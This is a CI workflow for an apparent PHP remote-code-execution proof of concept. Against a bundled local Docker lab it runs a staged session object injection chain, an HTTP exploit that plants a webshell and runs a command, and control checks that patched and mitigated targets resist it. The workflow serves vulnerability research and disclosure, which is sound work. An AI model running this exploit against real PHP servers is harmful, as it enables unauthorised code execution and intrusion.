name: CI

on:
  push:
  pull_request:

jobs:
  unit:
    name: Offline unit tests
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.11"
      - name: Install pytest
        run: python -m pip install --quiet pytest
      - name: Run unit tests
        run: python -m pytest tests/ -q

  e2e:
    name: End-to-end RCE against the bundled lab
    runs-on: ubuntu-latest
    timeout-minutes: 45
    steps:
      - uses: actions/checkout@v4

      - name: Start the lab (vulnerable / fixed / mitigated targets)
        # -p pins the project name so container names are deterministic
        # (phpaftershell-victim-1, ...) regardless of checkout directory.
        # --wait blocks until every healthcheck passes.
        run: docker compose -p phpaftershell up -d --wait

      - name: "Stage 1 - deterministic spliced-session object injection"
        run: python poc/stage1_splice.py

      - name: "Stage 2 - real interrupted pwrite via cgroup OOM"
        run: python poc/stage2_oom.py

      - name: "Fresh target for the remote exploit"
        # The local stages drive the lab hard (held connections, OOM
        # interrupts, dirty session files). Drop their residue (its dirty
        # pages only add writeback contention for the fresh cgroup) and
        # start from a clean target, exactly as a real engagement would.
        run: |
          rm -f sessions/sess_*
          docker compose -p phpaftershell up -d --force-recreate --wait victim
          curl -sf http://127.0.0.1:8087/

      - name: "Charge trace (diagnostic - victim charge curve on this host)"
        # lab-side harness (like the stages, may docker exec): prints the
        # cgroup charge curve of a real attempt so the log shows exactly
        # where this host crosses the limit
        run: python3 -u poc/charge_trace.py 8087

      - name: "Remote exploit - 100% HTTP RCE (webshell + command)"
        # the lab makes the webroot writable itself (compose command);
        # -u keeps the attempt feed live in the log even if the run is
        # cancelled mid-flight
        run: python3 -u ./phpaftershell-poc --target http://127.0.0.1:8087 --command 'id' --attempts 80

      - name: "Cross-SAPI - the same chain against nginx + php-fpm"
        # proves the exploit is SAPI-agnostic: different front-end,
        # different worker model, same vulnerable PHP
        run: python3 -u ./phpaftershell-poc --target http://127.0.0.1:8090 --command 'id' --attempts 40

      - name: "Control - patched PHP (8.4.28) must not be exploitable"
        # same real interruption path, must exhaust attempts without a hit
        run: "! python3 -u ./phpaftershell-poc --target http://127.0.0.1:8088 --command 'id' --attempts 8"

      - name: "Control - mitigated target (upload progress off) has no progress record"
        run: |
          SID=$(python -c 'import uuid;print(uuid.uuid4().hex)')
          curl -s -m 5 -b "PHPSESSID=$SID" \
            -F 'PHP_SESSION_UPLOAD_PROGRESS=tok' \
            -F 'file=@/etc/hostname;filename=c.txt' \
            --limit-rate 1k http://127.0.0.1:8089/index.php >/dev/null &
          sleep 2
          # session_start() always creates the session file; with the
          # mitigation on, it must contain NO upload progress record
          docker exec phpaftershell-mitigated-1 sh -c \
            "! grep -q upload_progress_ /tmp/sess_$SID 2>/dev/null"
